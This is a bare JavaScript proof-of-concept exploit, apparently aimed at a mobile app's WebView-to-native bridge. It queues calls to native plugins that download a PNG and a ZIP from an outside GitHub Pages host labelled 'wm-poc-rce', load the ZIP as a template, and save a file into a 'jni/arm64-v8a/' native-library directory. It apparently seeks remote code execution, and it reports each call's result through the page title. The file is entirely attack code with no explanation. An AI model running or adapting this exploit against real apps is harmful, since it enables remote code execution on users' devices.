(function(){
  document.title='P71PAY:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P71PCB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var q=[
    ['H1','CommonPlugin','GetPerformance',{}],
    ['C0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
    ['C1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
    ['C2','VirtualBackgroundWebPlugin','HandleSetVirtualBackground',{url:png,over_write:true,backgroundType:'picture'}],
    ['C5','VirtualBackgroundWebPlugin','DownloadFile',{url:zip,over_write:true}],
    ['I2','IdeaWebViewPlugin','GetWebViewSharePath',{}],
    ['I3','IdeaWebViewPlugin','DownloadIdeaFile',{url:zip,title:'p71',code:'123456789'}],
    ['T1','CommonPlugin','LoadTemplateWebView',{template_url:zip,url:zip}],
    ['S1','CommonPlugin','SavePic',{url:png,export_dir:'jni/arm64-v8a/'}],
    ['H2','CommonPlugin','GetPerformance',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P71PAY-DONE';return}
    var x=q[i++];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,900);
  }
  n();
})();
